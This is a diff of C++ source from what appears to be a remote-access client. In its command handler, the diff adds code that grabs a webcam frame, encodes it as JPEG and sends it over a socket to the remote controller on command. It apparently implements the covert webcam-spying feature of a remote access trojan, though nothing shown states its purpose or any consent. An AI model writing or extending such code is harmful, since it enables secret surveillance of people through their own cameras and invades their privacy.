@@ -389,30 +389,44 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
                 DebugPrint("[!] Camara iniciada correctamente");
                 std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
                 strHeader.append(1, CMD_DEL);
-
-                int iBufferSize = 0;
-                BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize);
-
-                int iHeaderSize = strHeader.size();
-                char* cBigBuff = new char[iHeaderSize + iBufferSize];
-
-                memcpy(cBigBuff, strHeader.c_str(), iHeaderSize);
-                memcpy(cBigBuff + iHeaderSize, cBuffer, iBufferSize);
-
-                //Send buffer
                 
-                delete[] cBigBuff;
-                cBigBuff = nullptr;
+                //Testing
+                int iBufferSize = 0;
+                int iHeaderSize = strHeader.size();
+                u_int iJPGBufferSize = 0;
+                u_int uiPacketSize = 0;
+                BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize);
+                BYTE* cJPGBuffer = nullptr;
+                BYTE* cPacket = nullptr;
 
-                delete[] cBuffer;
-                cBuffer = nullptr;
+                if (cBuffer) {
+                    cJPGBuffer = this->mod_Cam->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
+                    if (cJPGBuffer) {
+                        uiPacketSize = iHeaderSize + iJPGBufferSize;
+                        cPacket = new BYTE[uiPacketSize];
+                        if (cPacket) {
+                            memcpy(cPacket, strHeader.c_str(), iHeaderSize);
+                            memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
+
+                            this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
+
+                            delete[] cPacket;
+                            cPacket = nullptr;
+                        }
+                        delete[] cJPGBuffer;
+                        cJPGBuffer = nullptr;
+                    }
+                }
+
+                if (cBuffer) {
+                    delete[] cBuffer;
+                    cBuffer = nullptr;
+                }
             }
         }else {
             DebugPrint("[X] mod_Cam->ListCaptureDevices error");
         }
-        //ListCaptureDevices
-        //Init(IMFActivate*& pDevice)
-        //GetFrame
+
         return;
     }
     //#####################################################
